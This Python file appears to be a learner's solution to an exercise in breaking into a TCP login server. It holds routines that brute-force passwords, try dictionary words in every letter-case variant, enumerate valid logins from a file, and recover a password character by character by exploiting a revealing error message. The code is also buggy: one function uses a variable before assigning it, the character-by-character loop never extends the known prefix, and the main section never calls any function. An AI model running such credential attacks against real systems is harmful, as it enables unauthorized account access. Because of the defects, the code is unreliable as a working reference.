# write your code here

import socket
import argparse
import string
import itertools
import json
import sys


def send_pass(host: str, port: int):
    with socket.socket() as client_socket:
        address = (host, port)
        client_socket.connect(address)
        password = password.encode()
        client_socket.send(password)
        response = client_socket.recv(1024)
        response = response.decode()
        return response


def connect_to_server(ip_address, port_num):
    address = (ip_address, port_num)
    client = socket.socket()
    client.connect(address)
    return client


def log_pass_combo(login, password=' '):
    return dict(login=login, password=password)


def send_combo(client_socket, combo):
    req = json.dumps(combo, indent=4).encode()
    client_socket.send(req)
    resp_enc = client_socket.recv(1024)
    resp = json.loads(resp_enc.decode())
    return resp


def find_login(client_socket, login_file):
    login_list = login_file.readlines()
    login_list = (login.replace('\n', '') for login in login_list)
    for login in login_list:
        combo = log_pass_combo(login)
        resp = send_combo(client_socket, combo)
        if resp['result'] == "Wrong password!":
            return login


def password_gen():
    possible_signs = string.digits + string.ascii_lowercase
    for repeat in range(1, len(possible_signs) + 1):
        for var in itertools.product(possible_signs, repeat=repeat):
            yield ''.join(var)


def common_pass(password_file):
    password_list = password_file.readlines()
    number = 0
    for password in password_list:
        password_list[number] = password.replace('\n', '')
        number += 1
    for word in password_list:
        for combination in itertools.product(*[(c.upper(), c.lower()) for c in word]):
            password = "".join(combination)
            yield password


def simple_bruteforce(host: str, port: int):
    client_socket = connect_to_server(host, port)
    response = str('o')
    while response != 'Connection success!':
        for password in password_gen():
            password = password.encode()
            client_socket.send(password)
            response = client_socket.recv(1024)
            response = response.decode()
            if response == 'Connection success!':
                print(password.decode())
                break
            elif response == 'Too many attempts':
                print(response)


def smarter_bruteforce(host: str, port: int, password_file):
    client_socket = connect_to_server(host, port)
    response = str('o')
    while response != 'Connection success!':
        for password in common_pass(password_file):
            password = password.encode()
            client_socket.send(password)
            response = client_socket.recv(1024)
            response = response.decode()
            if response == 'Connection success!':
                print(password.decode())
                break
            elif response == 'Too many attempts':
                print(response)


def login_pass_hack(client, login):
    pass_chars = string.ascii_lowercase + string.ascii_uppercase + string.digits
    success = False
    password = ""
    while not success:
        for char in pass_chars:
            combo = log_pass_combo(login, password=' ' + char)
            resp = send_combo(client, combo)
            if resp["result"] == "Connection success!":
                print(json.dumps(combo))
                success = True
            if resp["result"] == "Exception happened during login":
                password += char
                break


parser = argparse.ArgumentParser()
parser.add_argument("host")
parser.add_argument("port")
parser.add_argument("password")

args = parser.parse_args()




